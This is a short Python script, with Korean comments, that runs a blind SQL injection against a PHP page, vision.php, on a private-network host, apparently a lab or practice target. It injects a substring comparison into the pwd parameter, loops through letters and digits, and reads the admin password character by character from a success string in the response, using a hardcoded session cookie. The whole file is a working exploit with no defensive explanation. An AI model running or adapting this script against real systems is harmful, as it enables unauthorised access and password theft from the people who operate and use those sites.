import requests
from bs4 import BeautifulSoup

query1 = "\' || substring(pwd,%d,1)= %s#"
dbname = []
password = []

word = ['\'a\'', '\'b\'', '\'c\'', '\'d\'', '\'e\'', '\'f\'', '\'g\'',
        '\'h\'', '\'i\'', '\'j\'', '\'k\'', '\'l\'', '\'m\'', '\'n\'', '\'o\'', '\'p\'', '\'q\'', '\'r\'', '\'s\'',
        '\'t\'', '\'u\'', '\'v\'', '\'w\'', '\'x\'', '\'y\'', '\'z\'', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
#print("상태 코드 : ",res.status_code)

print("========= Blind SQL injection ===========")
# 1. 사용하고 있는 DB 길이 알아내기.

print("######################data 분석 중")

num = 1
while num <= 8:

    for src in word:
        dbname = [query1 %(num, src)]

        cookies = {'PHPSESSID': 'mjdahbalnqhbbta7ordstu2dgh'}
        params = {'id': 'admin', 'pwd': dbname}
        res = requests.get('http://172.16.20.228/vision.php', params=params, cookies=cookies)
        code = res.text  # 전체 코드
        search = "good~ ^0^."  # 참일시 나오는 결과 값

        if search in code: #코드안에 참일 시 나오는 값이 들어가 있다면
            print("Data : ", src)
            password += src
            #print(dbname)
            break


    num = num+1

print("###########################완료")
print('pwd : ', '_'.join(password))